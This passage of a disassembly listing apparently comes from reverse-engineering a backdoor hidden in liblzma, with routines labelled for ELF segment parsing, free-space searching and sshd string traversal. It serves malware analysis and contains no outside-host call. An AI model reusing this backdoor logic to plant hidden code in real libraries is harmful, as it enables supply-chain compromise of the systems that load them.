.text.delta_coder_ena:0000000000001E75 loc_1E75:                               ; CODE XREF: _Ldelta_coder_end_1+E↑j
.text.delta_coder_ena:0000000000001E75                                         ; _Ldelta_coder_end_1+15↑j
.text.delta_coder_ena:0000000000001E75                 xor     eax, eax
.text.delta_coder_ena:0000000000001E77                 retn
.text.delta_coder_ena:0000000000001E77 _Ldelta_coder_end_1 endp
.text.delta_coder_ena:0000000000001E77
.text.delta_coder_ena:0000000000001E77 _text_delta_coder_ena ends
.text.delta_coder_ena:0000000000001E77
.text.delta_decoda:0000000000001E80 ; ===========================================================================
.text.delta_decoda:0000000000001E80
.text.delta_decoda:0000000000001E80 ; Segment type: Pure code
.text.delta_decoda:0000000000001E80 ; Segment permissions: Read/Execute
.text.delta_decoda:0000000000001E80 _text_delta_decoda segment para public 'CODE' use64
.text.delta_decoda:0000000000001E80                 assume cs:_text_delta_decoda
.text.delta_decoda:0000000000001E80                 ;org 1E80h
.text.delta_decoda:0000000000001E80                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.delta_decoda:0000000000001E80
.text.delta_decoda:0000000000001E80 ; =============== S U B R O U T I N E =======================================
.text.delta_decoda:0000000000001E80
.text.delta_decoda:0000000000001E80
.text.delta_decoda:0000000000001E80 ; __int64 __fastcall Ldelta_decode_part_0(__int64, int)
.text.delta_decoda:0000000000001E80 _Ldelta_decode_part_0 proc near         ; CODE XREF: sub_2540+7A↓p
.text.delta_decoda:0000000000001E80                 endbr64
.text.delta_decoda:0000000000001E84                 mov     r8d, esi
.text.delta_decoda:0000000000001E87                 test    byte ptr [rdi+0D0h], 2
.text.delta_decoda:0000000000001E8E                 jz      short loc_1EA8
.text.delta_decoda:0000000000001E90                 mov     edx, [rdi+80h]
.text.delta_decoda:0000000000001E96                 test    edx, edx
.text.delta_decoda:0000000000001E98                 jz      short loc_1EA8
.text.delta_decoda:0000000000001E9A                 mov     rsi, [rdi+78h]
.text.delta_decoda:0000000000001E9E                 mov     ecx, 6
.text.delta_decoda:0000000000001EA3                 jmp     _Llz_encode_1   ; PIC mode
.text.delta_decoda:0000000000001EA8 ; ---------------------------------------------------------------------------
.text.delta_decoda:0000000000001EA8
.text.delta_decoda:0000000000001EA8 loc_1EA8:                               ; CODE XREF: _Ldelta_decode_part_0+E↑j
.text.delta_decoda:0000000000001EA8                                         ; _Ldelta_decode_part_0+18↑j
.text.delta_decoda:0000000000001EA8                 xor     eax, eax
.text.delta_decoda:0000000000001EAA                 retn
.text.delta_decoda:0000000000001EAA _Ldelta_decode_part_0 endp
.text.delta_decoda:0000000000001EAA
.text.delta_decoda:0000000000001EAA _text_delta_decoda ends
.text.delta_decoda:0000000000001EAA
.text.lzma_check_updata:0000000000001EB0 ; ===========================================================================
.text.lzma_check_updata:0000000000001EB0
.text.lzma_check_updata:0000000000001EB0 ; Segment type: Pure code
.text.lzma_check_updata:0000000000001EB0 ; Segment permissions: Read/Execute
.text.lzma_check_updata:0000000000001EB0 _text_lzma_check_updata segment para public 'CODE' use64
.text.lzma_check_updata:0000000000001EB0                 assume cs:_text_lzma_check_updata
.text.lzma_check_updata:0000000000001EB0                 ;org 1EB0h
.text.lzma_check_updata:0000000000001EB0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_check_updata:0000000000001EB0
.text.lzma_check_updata:0000000000001EB0 ; =============== S U B R O U T I N E =======================================
.text.lzma_check_updata:0000000000001EB0
.text.lzma_check_updata:0000000000001EB0
.text.lzma_check_updata:0000000000001EB0 ; unsigned __int64 __fastcall Llzma_check_update_0(__int64, unsigned __int64 *)
.text.lzma_check_updata:0000000000001EB0 _Llzma_check_update_0 proc near         ; CODE XREF: _Lindex_tree_append_part_0+62↓p
.text.lzma_check_updata:0000000000001EB0                                         ; sub_2540+3F↓p ...
.text.lzma_check_updata:0000000000001EB0                 endbr64
.text.lzma_check_updata:0000000000001EB4                 push    r12
.text.lzma_check_updata:0000000000001EB6                 mov     edx, 7
.text.lzma_check_updata:0000000000001EBB                 mov     r12, rsi
.text.lzma_check_updata:0000000000001EBE                 mov     esi, 0CBh
.text.lzma_check_updata:0000000000001EC3                 push    rbx
.text.lzma_check_updata:0000000000001EC4                 mov     rbx, rdi
.text.lzma_check_updata:0000000000001EC7                 xor     edi, edi
.text.lzma_check_updata:0000000000001EC9                 push    rcx
.text.lzma_check_updata:0000000000001ECA                 mov     ecx, 0Ch
.text.lzma_check_updata:0000000000001ECF                 call    apply_one_entry_ex ; PIC mode
.text.lzma_check_updata:0000000000001ED4                 mov     edx, eax
.text.lzma_check_updata:0000000000001ED6                 xor     eax, eax
.text.lzma_check_updata:0000000000001ED8                 test    edx, edx
.text.lzma_check_updata:0000000000001EDA                 jz      short loc_1F59
.text.lzma_check_updata:0000000000001EDC                 mov     rax, [rbx+98h]
.text.lzma_check_updata:0000000000001EE3                 mov     rdx, [rbx]
.text.lzma_check_updata:0000000000001EE6                 test    rax, rax
.text.lzma_check_updata:0000000000001EE9                 jnz     short loc_1EF3
.text.lzma_check_updata:0000000000001EEB                 movzx   edi, word ptr [rbx+18h]
.text.lzma_check_updata:0000000000001EEF                 xor     esi, esi
.text.lzma_check_updata:0000000000001EF1                 jmp     short loc_1EFF
.text.lzma_check_updata:0000000000001EF3 ; ---------------------------------------------------------------------------
.text.lzma_check_updata:0000000000001EF3
.text.lzma_check_updata:0000000000001EF3 loc_1EF3:                               ; CODE XREF: _Llzma_check_update_0+39↑j
.text.lzma_check_updata:0000000000001EF3                 mov     rdx, [rbx+0A0h]
.text.lzma_check_updata:0000000000001EFA                 jmp     short loc_1F55
.text.lzma_check_updata:0000000000001EFC ; ---------------------------------------------------------------------------
.text.lzma_check_updata:0000000000001EFC
.text.lzma_check_updata:0000000000001EFC loc_1EFC:                               ; CODE XREF: _Llzma_check_update_0+5E↓j
.text.lzma_check_updata:0000000000001EFC                                         ; _Llzma_check_update_0+64↓j
.text.lzma_check_updata:0000000000001EFC                 inc     rsi
.text.lzma_check_updata:0000000000001EFF
.text.lzma_check_updata:0000000000001EFF loc_1EFF:                               ; CODE XREF: _Llzma_check_update_0+41↑j
.text.lzma_check_updata:0000000000001EFF                 cmp     esi, edi
.text.lzma_check_updata:0000000000001F01                 jnb     short loc_1F59
.text.lzma_check_updata:0000000000001F03                 imul    rcx, rsi, 38h ; '8'
.text.lzma_check_updata:0000000000001F07                 add     rcx, [rbx+10h]
.text.lzma_check_updata:0000000000001F0B                 cmp     dword ptr [rcx], 1
.text.lzma_check_updata:0000000000001F0E                 jnz     short loc_1EFC
.text.lzma_check_updata:0000000000001F10                 test    byte ptr [rcx+4], 1
.text.lzma_check_updata:0000000000001F14                 jz      short loc_1EFC
.text.lzma_check_updata:0000000000001F16                 mov     rax, rdx
.text.lzma_check_updata:0000000000001F19                 mov     rdx, [rcx+28h]
.text.lzma_check_updata:0000000000001F1D                 sub     rax, [rbx+8]
.text.lzma_check_updata:0000000000001F21                 add     rax, [rcx+10h]
.text.lzma_check_updata:0000000000001F25                 add     rdx, rax
.text.lzma_check_updata:0000000000001F28                 and     rax, 0FFFFFFFFFFFFF000h
.text.lzma_check_updata:0000000000001F2E                 test    edx, 0FFFh
.text.lzma_check_updata:0000000000001F34                 jz      short loc_1F44
.text.lzma_check_updata:0000000000001F36                 and     rdx, 0FFFFFFFFFFFFF000h
.text.lzma_check_updata:0000000000001F3D                 add     rdx, 1000h
.text.lzma_check_updata:0000000000001F44
.text.lzma_check_updata:0000000000001F44 loc_1F44:                               ; CODE XREF: _Llzma_check_update_0+84↑j
.text.lzma_check_updata:0000000000001F44                 sub     rdx, rax
.text.lzma_check_updata:0000000000001F47                 mov     [rbx+98h], rax
.text.lzma_check_updata:0000000000001F4E                 mov     [rbx+0A0h], rdx
.text.lzma_check_updata:0000000000001F55
.text.lzma_check_updata:0000000000001F55 loc_1F55:                               ; CODE XREF: _Llzma_check_update_0+4A↑j
.text.lzma_check_updata:0000000000001F55                 mov     [r12], rdx
.text.lzma_check_updata:0000000000001F59
.text.lzma_check_updata:0000000000001F59 loc_1F59:                               ; CODE XREF: _Llzma_check_update_0+2A↑j
.text.lzma_check_updata:0000000000001F59                                         ; _Llzma_check_update_0+51↑j
.text.lzma_check_updata:0000000000001F59                 pop     rdx
.text.lzma_check_updata:0000000000001F5A                 pop     rbx
.text.lzma_check_updata:0000000000001F5B                 pop     r12
.text.lzma_check_updata:0000000000001F5D                 retn
.text.lzma_check_updata:0000000000001F5D _Llzma_check_update_0 endp
.text.lzma_check_updata:0000000000001F5D
.text.lzma_check_updata:0000000000001F5D _text_lzma_check_updata ends
.text.lzma_check_updata:0000000000001F5D
.text.index_tree_appena:0000000000001F60 ; ===========================================================================
.text.index_tree_appena:0000000000001F60
.text.index_tree_appena:0000000000001F60 ; Segment type: Pure code
.text.index_tree_appena:0000000000001F60 ; Segment permissions: Read/Execute
.text.index_tree_appena:0000000000001F60 _text_index_tree_appena segment para public 'CODE' use64
.text.index_tree_appena:0000000000001F60                 assume cs:_text_index_tree_appena
.text.index_tree_appena:0000000000001F60                 ;org 1F60h
.text.index_tree_appena:0000000000001F60                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.index_tree_appena:0000000000001F60
.text.index_tree_appena:0000000000001F60 ; =============== S U B R O U T I N E =======================================
.text.index_tree_appena:0000000000001F60
.text.index_tree_appena:0000000000001F60
.text.index_tree_appena:0000000000001F60 ; unsigned __int64 __fastcall Lindex_tree_append_part_0(__int64, unsigned __int64 *)
.text.index_tree_appena:0000000000001F60 _Lindex_tree_append_part_0 proc near    ; CODE XREF: _Llzip_decode_0+45↓p
.text.index_tree_appena:0000000000001F60
.text.index_tree_appena:0000000000001F60 var_20          = qword ptr -20h
.text.index_tree_appena:0000000000001F60
.text.index_tree_appena:0000000000001F60                 endbr64
.text.index_tree_appena:0000000000001F64                 push    r13
.text.index_tree_appena:0000000000001F66                 xor     ecx, ecx
.text.index_tree_appena:0000000000001F68                 mov     edx, 0Bh
.text.index_tree_appena:0000000000001F6D                 push    r12
.text.index_tree_appena:0000000000001F6F                 mov     r12, rsi
.text.index_tree_appena:0000000000001F72                 mov     esi, 0Eh
.text.index_tree_appena:0000000000001F77                 push    rbx
.text.index_tree_appena:0000000000001F78                 mov     rbx, rdi
.text.index_tree_appena:0000000000001F7B                 mov     edi, 0BDh
.text.index_tree_appena:0000000000001F80                 sub     rsp, 10h
.text.index_tree_appena:0000000000001F84                 call    _Llzma_index_iter_rewind_cold ; PIC mode
.text.index_tree_appena:0000000000001F89                 test    eax, eax
.text.index_tree_appena:0000000000001F8B                 jnz     short loc_1F94
.text.index_tree_appena:0000000000001F8D
.text.index_tree_appena:0000000000001F8D loc_1F8D:                               ; CODE XREF: _Lindex_tree_append_part_0+6D↓j
.text.index_tree_appena:0000000000001F8D                                         ; _Lindex_tree_append_part_0+104↓j
.text.index_tree_appena:0000000000001F8D                 xor     eax, eax
.text.index_tree_appena:0000000000001F8F                 jmp     loc_207C
.text.index_tree_appena:0000000000001F94 ; ---------------------------------------------------------------------------
.text.index_tree_appena:0000000000001F94
.text.index_tree_appena:0000000000001F94 loc_1F94:                               ; CODE XREF: _Lindex_tree_append_part_0+2B↑j
.text.index_tree_appena:0000000000001F94                 mov     rax, [rbx+0A8h]
.text.index_tree_appena:0000000000001F9B                 xor     esi, esi
.text.index_tree_appena:0000000000001F9D                 mov     r13, [rbx]
.text.index_tree_appena:0000000000001FA0                 mov     [rsp+28h+var_20], rsi
.text.index_tree_appena:0000000000001FA5                 test    rax, rax
.text.index_tree_appena:0000000000001FA8                 jz      short loc_1FBA
.text.index_tree_appena:0000000000001FAA                 mov     rdx, [rbx+0B0h]
.text.index_tree_appena:0000000000001FB1                 mov     [r12], rdx
.text.index_tree_appena:0000000000001FB5                 jmp     loc_207C
.text.index_tree_appena:0000000000001FBA ; ---------------------------------------------------------------------------
.text.index_tree_appena:0000000000001FBA
.text.index_tree_appena:0000000000001FBA loc_1FBA:                               ; CODE XREF: _Lindex_tree_append_part_0+48↑j
.text.index_tree_appena:0000000000001FBA                 lea     rsi, [rsp+28h+var_20]
.text.index_tree_appena:0000000000001FBF                 mov     rdi, rbx
.text.index_tree_appena:0000000000001FC2                 call    _Llzma_check_update_0 ; PIC mode
.text.index_tree_appena:0000000000001FC7                 mov     rsi, rax
.text.index_tree_appena:0000000000001FCA                 test    rax, rax
.text.index_tree_appena:0000000000001FCD                 jz      short loc_1F8D
.text.index_tree_appena:0000000000001FCF                 movzx   r10d, word ptr [rbx+18h]
.text.index_tree_appena:0000000000001FD4                 add     rsi, [rsp+28h+var_20]
.text.index_tree_appena:0000000000001FD9                 xor     r8d, r8d
.text.index_tree_appena:0000000000001FDC                 xor     r9d, r9d
.text.index_tree_appena:0000000000001FDF                 xor     edi, edi
.text.index_tree_appena:0000000000001FE1                 xor     eax, eax
.text.index_tree_appena:0000000000001FE3
.text.index_tree_appena:0000000000001FE3 loc_1FE3:                               ; CODE XREF: _Lindex_tree_append_part_0+FF↓j
.text.index_tree_appena:0000000000001FE3                 cmp     r8d, r10d
.text.index_tree_appena:0000000000001FE6                 jnb     short loc_2061
.text.index_tree_appena:0000000000001FE8                 imul    rcx, r8, 38h ; '8'
.text.index_tree_appena:0000000000001FEC                 add     rcx, [rbx+10h]
.text.index_tree_appena:0000000000001FF0                 cmp     dword ptr [rcx], 1
.text.index_tree_appena:0000000000001FF3                 jnz     short loc_205C
.text.index_tree_appena:0000000000001FF5                 mov     edx, [rcx+4]
.text.index_tree_appena:0000000000001FF8                 and     edx, 7
.text.index_tree_appena:0000000000001FFB                 cmp     edx, 4
.text.index_tree_appena:0000000000001FFE                 jnz     short loc_205C
.text.index_tree_appena:0000000000002000                 mov     r11, [rcx+28h]
.text.index_tree_appena:0000000000002004                 mov     rdx, r13
.text.index_tree_appena:0000000000002007                 sub     rdx, [rbx+8]
.text.index_tree_appena:000000000000200B                 add     rdx, [rcx+10h]
.text.index_tree_appena:000000000000200F                 add     r11, rdx
.text.index_tree_appena:0000000000002012                 and     rdx, 0FFFFFFFFFFFFF000h
.text.index_tree_appena:0000000000002019                 mov     rcx, r11
.text.index_tree_appena:000000000000201C                 test    r11d, 0FFFh
.text.index_tree_appena:0000000000002023                 jz      short loc_2033
.text.index_tree_appena:0000000000002025                 and     rcx, 0FFFFFFFFFFFFF000h
.text.index_tree_appena:000000000000202C                 add     rcx, 1000h
.text.index_tree_appena:0000000000002033
.text.index_tree_appena:0000000000002033 loc_2033:                               ; CODE XREF: _Lindex_tree_append_part_0+C3↑j
.text.index_tree_appena:0000000000002033                 cmp     rdx, rsi
.text.index_tree_appena:0000000000002036                 jb      short loc_205C
.text.index_tree_appena:0000000000002038                 test    r9d, r9d
.text.index_tree_appena:000000000000203B                 jnz     short loc_204E
.text.index_tree_appena:000000000000203D                 mov     rdi, rcx
.text.index_tree_appena:0000000000002040                 mov     rax, rdx
.text.index_tree_appena:0000000000002043                 mov     r9d, 1
.text.index_tree_appena:0000000000002049                 sub     rdi, rdx
.text.index_tree_appena:000000000000204C                 jmp     short loc_205C
.text.index_tree_appena:000000000000204E ; ---------------------------------------------------------------------------
.text.index_tree_appena:000000000000204E
.text.index_tree_appena:000000000000204E loc_204E:                               ; CODE XREF: _Lindex_tree_append_part_0+DB↑j
.text.index_tree_appena:000000000000204E                 cmp     rdx, rax
.text.index_tree_appena:0000000000002051                 jnb     short loc_205C
.text.index_tree_appena:0000000000002053                 mov     rdi, rcx
.text.index_tree_appena:0000000000002056                 mov     rax, rdx
.text.index_tree_appena:0000000000002059                 sub     rdi, rdx
.text.index_tree_appena:000000000000205C
.text.index_tree_appena:000000000000205C loc_205C:                               ; CODE XREF: _Lindex_tree_append_part_0+93↑j
.text.index_tree_appena:000000000000205C                                         ; _Lindex_tree_append_part_0+9E↑j ...
.text.index_tree_appena:000000000000205C                 inc     r8
.text.index_tree_appena:000000000000205F                 jmp     short loc_1FE3
.text.index_tree_appena:0000000000002061 ; ---------------------------------------------------------------------------
.text.index_tree_appena:0000000000002061
.text.index_tree_appena:0000000000002061 loc_2061:                               ; CODE XREF: _Lindex_tree_append_part_0+86↑j
.text.index_tree_appena:0000000000002061                 test    r9d, r9d
.text.index_tree_appena:0000000000002064                 jz      loc_1F8D
.text.index_tree_appena:000000000000206A                 mov     [rbx+0A8h], rax
.text.index_tree_appena:0000000000002071                 mov     [rbx+0B0h], rdi
.text.index_tree_appena:0000000000002078                 mov     [r12], rdi
.text.index_tree_appena:000000000000207C
.text.index_tree_appena:000000000000207C loc_207C:                               ; CODE XREF: _Lindex_tree_append_part_0+2F↑j
.text.index_tree_appena:000000000000207C                                         ; _Lindex_tree_append_part_0+55↑j
.text.index_tree_appena:000000000000207C                 add     rsp, 10h
.text.index_tree_appena:0000000000002080                 pop     rbx
.text.index_tree_appena:0000000000002081                 pop     r12
.text.index_tree_appena:0000000000002083                 pop     r13
.text.index_tree_appena:0000000000002085                 retn
.text.index_tree_appena:0000000000002085 _Lindex_tree_append_part_0 endp
.text.index_tree_appena:0000000000002085
.text.index_tree_appena:0000000000002085 _text_index_tree_appena ends
.text.index_tree_appena:0000000000002085
.text.lzip_decoda:0000000000002090 ; ===========================================================================
.text.lzip_decoda:0000000000002090
.text.lzip_decoda:0000000000002090 ; Segment type: Pure code
.text.lzip_decoda:0000000000002090 ; Segment permissions: Read/Execute
.text.lzip_decoda:0000000000002090 _text_lzip_decoda segment para public 'CODE' use64
.text.lzip_decoda:0000000000002090                 assume cs:_text_lzip_decoda
.text.lzip_decoda:0000000000002090                 ;org 2090h
.text.lzip_decoda:0000000000002090                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzip_decoda:0000000000002090
.text.lzip_decoda:0000000000002090 ; =============== S U B R O U T I N E =======================================
.text.lzip_decoda:0000000000002090
.text.lzip_decoda:0000000000002090
.text.lzip_decoda:0000000000002090 ; char *__fastcall Llzip_decode_0(__int64, unsigned int *, char *)
.text.lzip_decoda:0000000000002090 _Llzip_decode_0 proc near               ; CODE XREF: sub_2D20+9D↓p
.text.lzip_decoda:0000000000002090                                         ; _Llzma_auto_decode_1+45↓p ...
.text.lzip_decoda:0000000000002090
.text.lzip_decoda:0000000000002090 var_30          = qword ptr -30h
.text.lzip_decoda:0000000000002090
.text.lzip_decoda:0000000000002090                 endbr64
.text.lzip_decoda:0000000000002094                 push    r14
.text.lzip_decoda:0000000000002096                 xor     ecx, ecx
.text.lzip_decoda:0000000000002098                 mov     r14, rdx
.text.lzip_decoda:000000000000209B                 mov     edx, 0Ah
.text.lzip_decoda:00000000000020A0                 push    r13
.text.lzip_decoda:00000000000020A2                 mov     r13, rsi
.text.lzip_decoda:00000000000020A5                 mov     esi, 7
.text.lzip_decoda:00000000000020AA                 push    r12
.text.lzip_decoda:00000000000020AC                 push    rbx
.text.lzip_decoda:00000000000020AD                 mov     rbx, rdi
.text.lzip_decoda:00000000000020B0                 mov     edi, 0B6h
.text.lzip_decoda:00000000000020B5                 sub     rsp, 18h
.text.lzip_decoda:00000000000020B9                 call    _Llzma_index_iter_rewind_cold ; PIC mode
.text.lzip_decoda:00000000000020BE                 test    eax, eax
.text.lzip_decoda:00000000000020C0                 jnz     short loc_20C6
.text.lzip_decoda:00000000000020C2
.text.lzip_decoda:00000000000020C2 loc_20C2:                               ; CODE XREF: _Llzip_decode_0+50↓j
.text.lzip_decoda:00000000000020C2                                         ; _Llzip_decode_0+5B↓j ...
.text.lzip_decoda:00000000000020C2                 xor     ebx, ebx
.text.lzip_decoda:00000000000020C4                 jmp     short loc_212E
.text.lzip_decoda:00000000000020C6 ; ---------------------------------------------------------------------------
.text.lzip_decoda:00000000000020C6
.text.lzip_decoda:00000000000020C6 loc_20C6:                               ; CODE XREF: _Llzip_decode_0+30↑j
.text.lzip_decoda:00000000000020C6                 xor     eax, eax
.text.lzip_decoda:00000000000020C8                 mov     rdi, rbx
.text.lzip_decoda:00000000000020CB                 lea     rsi, [rsp+38h+var_30]
.text.lzip_decoda:00000000000020D0                 mov     [rsp+38h+var_30], rax
.text.lzip_decoda:00000000000020D5                 call    _Lindex_tree_append_part_0 ; PIC mode
.text.lzip_decoda:00000000000020DA                 mov     rbx, rax
.text.lzip_decoda:00000000000020DD                 test    rax, rax
.text.lzip_decoda:00000000000020E0                 jz      short loc_20C2
.text.lzip_decoda:00000000000020E2                 mov     r12, [rsp+38h+var_30]
.text.lzip_decoda:00000000000020E7                 cmp     r12, 2Bh ; '+'
.text.lzip_decoda:00000000000020EB                 jbe     short loc_20C2
.text.lzip_decoda:00000000000020ED                 add     r12, rax
.text.lzip_decoda:00000000000020F0                 test    r14, r14
.text.lzip_decoda:00000000000020F3                 jz      short loc_2115
.text.lzip_decoda:00000000000020F5                 cmp     r14, r12
.text.lzip_decoda:00000000000020F8                 jnb     short loc_20C2
.text.lzip_decoda:00000000000020FA                 cmp     rax, r14
.text.lzip_decoda:00000000000020FD                 cmovb   rbx, r14
.text.lzip_decoda:0000000000002101                 jmp     short loc_2115
.text.lzip_decoda:0000000000002103 ; ---------------------------------------------------------------------------
.text.lzip_decoda:0000000000002103
.text.lzip_decoda:0000000000002103 loc_2103:                               ; CODE XREF: _Llzip_decode_0+88↓j
.text.lzip_decoda:0000000000002103                 mov     rsi, r12        ; unsigned __int64
.text.lzip_decoda:0000000000002106                 mov     rdi, rbx        ; _BYTE *
.text.lzip_decoda:0000000000002109                 call    table_get       ; PIC mode
.text.lzip_decoda:000000000000210E                 test    eax, eax
.text.lzip_decoda:0000000000002110                 jnz     short loc_211C
.text.lzip_decoda:0000000000002112
.text.lzip_decoda:0000000000002112 loc_2112:                               ; CODE XREF: _Llzip_decode_0+96↓j
.text.lzip_decoda:0000000000002112                 inc     rbx
.text.lzip_decoda:0000000000002115
.text.lzip_decoda:0000000000002115 loc_2115:                               ; CODE XREF: _Llzip_decode_0+63↑j
.text.lzip_decoda:0000000000002115                                         ; _Llzip_decode_0+71↑j
.text.lzip_decoda:0000000000002115                 cmp     rbx, r12
.text.lzip_decoda:0000000000002118                 jb      short loc_2103
.text.lzip_decoda:000000000000211A                 jmp     short loc_20C2
.text.lzip_decoda:000000000000211C ; ---------------------------------------------------------------------------
.text.lzip_decoda:000000000000211C
.text.lzip_decoda:000000000000211C loc_211C:                               ; CODE XREF: _Llzip_decode_0+80↑j
.text.lzip_decoda:000000000000211C                 mov     edx, [r13+0]
.text.lzip_decoda:0000000000002120                 test    edx, edx
.text.lzip_decoda:0000000000002122                 jz      short loc_212A
.text.lzip_decoda:0000000000002124                 cmp     edx, eax
.text.lzip_decoda:0000000000002126                 jnz     short loc_2112
.text.lzip_decoda:0000000000002128                 jmp     short loc_212E
.text.lzip_decoda:000000000000212A ; ---------------------------------------------------------------------------
.text.lzip_decoda:000000000000212A
.text.lzip_decoda:000000000000212A loc_212A:                               ; CODE XREF: _Llzip_decode_0+92↑j
.text.lzip_decoda:000000000000212A                 mov     [r13+0], eax
.text.lzip_decoda:000000000000212E
.text.lzip_decoda:000000000000212E loc_212E:                               ; CODE XREF: _Llzip_decode_0+34↑j
.text.lzip_decoda:000000000000212E                                         ; _Llzip_decode_0+98↑j
.text.lzip_decoda:000000000000212E                 add     rsp, 18h
.text.lzip_decoda:0000000000002132                 mov     rax, rbx
.text.lzip_decoda:0000000000002135                 pop     rbx
.text.lzip_decoda:0000000000002136                 pop     r12
.text.lzip_decoda:0000000000002138                 pop     r13
.text.lzip_decoda:000000000000213A                 pop     r14
.text.lzip_decoda:000000000000213C                 retn
.text.lzip_decoda:000000000000213C _Llzip_decode_0 endp
.text.lzip_decoda:000000000000213C
.text.lzip_decoda:000000000000213C _text_lzip_decoda ends
.text.lzip_decoda:000000000000213C
.text.microlzma_decoda:0000000000002140 ; ===========================================================================
.text.microlzma_decoda:0000000000002140
.text.microlzma_decoda:0000000000002140 ; Segment type: Pure code
.text.microlzma_decoda:0000000000002140 ; Segment permissions: Read/Execute
.text.microlzma_decoda:0000000000002140 _text_microlzma_decoda segment para public 'CODE' use64
.text.microlzma_decoda:0000000000002140                 assume cs:_text_microlzma_decoda
.text.microlzma_decoda:0000000000002140                 ;org 2140h
.text.microlzma_decoda:0000000000002140                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.microlzma_decoda:0000000000002140
.text.microlzma_decoda:0000000000002140 ; =============== S U B R O U T I N E =======================================
.text.microlzma_decoda:0000000000002140
.text.microlzma_decoda:0000000000002140
.text.microlzma_decoda:0000000000002140 ; __int64 __fastcall maybe_find_freespaces(struct_elf_info *, unsigned __int64 *, int)
.text.microlzma_decoda:0000000000002140 maybe_find_freespaces proc near         ; CODE XREF: traversal_dynstr_sshd+112↓p
.text.microlzma_decoda:0000000000002140                                         ; _Llzma_mf_bt4_find_0+65↓p ...
.text.microlzma_decoda:0000000000002140                 endbr64
.text.microlzma_decoda:0000000000002144                 mov     rcx, rdi
.text.microlzma_decoda:0000000000002147                 mov     edi, edx
.text.microlzma_decoda:0000000000002149                 mov     rax, [rcx+0B8h]
.text.microlzma_decoda:0000000000002150                 mov     r9, [rcx]
.text.microlzma_decoda:0000000000002153                 test    rax, rax
.text.microlzma_decoda:0000000000002156                 jnz     short loc_2173
.text.microlzma_decoda:0000000000002158                 push    r15
.text.microlzma_decoda:000000000000215A                 xor     r10d, r10d
.text.microlzma_decoda:000000000000215D                 xor     r11d, r11d
.text.microlzma_decoda:0000000000002160                 push    r14
.text.microlzma_decoda:0000000000002162                 movzx   r14d, word ptr [rcx+18h]
.text.microlzma_decoda:0000000000002167                 push    r13
.text.microlzma_decoda:0000000000002169                 push    r12
.text.microlzma_decoda:000000000000216B                 xor     r12d, r12d
.text.microlzma_decoda:000000000000216E                 push    rbx
.text.microlzma_decoda:000000000000216F                 xor     ebx, ebx
.text.microlzma_decoda:0000000000002171                 jmp     short loc_21AF
.text.microlzma_decoda:0000000000002173 ; ---------------------------------------------------------------------------
.text.microlzma_decoda:0000000000002173
.text.microlzma_decoda:0000000000002173 loc_2173:                               ; CODE XREF: maybe_find_freespaces+16↑j
.text.microlzma_decoda:0000000000002173                 test    edx, edx
.text.microlzma_decoda:0000000000002175                 jnz     short loc_2182
.text.microlzma_decoda:0000000000002177                 mov     rdx, [rcx+0C0h]
.text.microlzma_decoda:000000000000217E                 mov     [rsi], rdx
.text.microlzma_decoda:0000000000002181                 retn
.text.microlzma_decoda:0000000000002182 ; ---------------------------------------------------------------------------
.text.microlzma_decoda:0000000000002182
.text.microlzma_decoda:0000000000002182 loc_2182:                               ; CODE XREF: maybe_find_freespaces+35↑j
.text.microlzma_decoda:0000000000002182                 mov     rdx, [rcx+0C8h]
.text.microlzma_decoda:0000000000002189                 mov     [rsi], rdx
.text.microlzma_decoda:000000000000218C                 sub     rax, rdx
.text.microlzma_decoda:000000000000218F                 test    rdx, rdx
.text.microlzma_decoda:0000000000002192                 jnz     locret_22BF
.text.microlzma_decoda:0000000000002198                 xor     eax, eax
.text.microlzma_decoda:000000000000219A                 jmp     locret_22BF
.text.microlzma_decoda:000000000000219F ; ---------------------------------------------------------------------------
.text.microlzma_decoda:000000000000219F
.text.microlzma_decoda:000000000000219F loc_219F:                               ; CODE XREF: maybe_find_freespaces+75↓j
.text.microlzma_decoda:000000000000219F                 imul    rdx, r10, 38h ; '8'
.text.microlzma_decoda:00000000000021A3                 add     rdx, [rcx+10h]
.text.microlzma_decoda:00000000000021A7                 cmp     dword ptr [rdx], 1
.text.microlzma_decoda:00000000000021AA                 jz      short loc_21BC
.text.microlzma_decoda:00000000000021AC
.text.microlzma_decoda:00000000000021AC loc_21AC:                               ; CODE XREF: maybe_find_freespaces+88↓j
.text.microlzma_decoda:00000000000021AC                                         ; maybe_find_freespaces+E1↓j ...
.text.microlzma_decoda:00000000000021AC                 inc     r10
.text.microlzma_decoda:00000000000021AF
.text.microlzma_decoda:00000000000021AF loc_21AF:                               ; CODE XREF: maybe_find_freespaces+31↑j
.text.microlzma_decoda:00000000000021AF                 mov     r13d, r10d
.text.microlzma_decoda:00000000000021B2                 cmp     r10d, r14d
.text.microlzma_decoda:00000000000021B5                 jb      short loc_219F
.text.microlzma_decoda:00000000000021B7                 jmp     loc_223D
.text.microlzma_decoda:00000000000021BC ; ---------------------------------------------------------------------------
.text.microlzma_decoda:00000000000021BC
.text.microlzma_decoda:00000000000021BC loc_21BC:                               ; CODE XREF: maybe_find_freespaces+6A↑j
.text.microlzma_decoda:00000000000021BC                 mov     r8d, [rdx+4]
.text.microlzma_decoda:00000000000021C0                 and     r8d, 7
.text.microlzma_decoda:00000000000021C4                 cmp     r8d, 6
.text.microlzma_decoda:00000000000021C8                 jnz     short loc_21AC
.text.microlzma_decoda:00000000000021CA                 mov     r15, [rdx+28h]
.text.microlzma_decoda:00000000000021CE                 cmp     r15, [rdx+20h]
.text.microlzma_decoda:00000000000021D2                 jnb     short loc_21DB
.text.microlzma_decoda:00000000000021D4
.text.microlzma_decoda:00000000000021D4 loc_21D4:                               ; CODE XREF: maybe_find_freespaces+100↓j
.text.microlzma_decoda:00000000000021D4                                         ; maybe_find_freespaces+16C↓j
.text.microlzma_decoda:00000000000021D4                 xor     eax, eax
.text.microlzma_decoda:00000000000021D6                 jmp     loc_22B5
.text.microlzma_decoda:00000000000021DB ; ---------------------------------------------------------------------------
.text.microlzma_decoda:00000000000021DB
.text.microlzma_decoda:00000000000021DB loc_21DB:                               ; CODE XREF: maybe_find_freespaces+92↑j
.text.microlzma_decoda:00000000000021DB                 mov     r8, r9
.text.microlzma_decoda:00000000000021DE                 sub     r8, [rcx+8]
.text.microlzma_decoda:00000000000021E2                 add     r8, [rdx+10h]
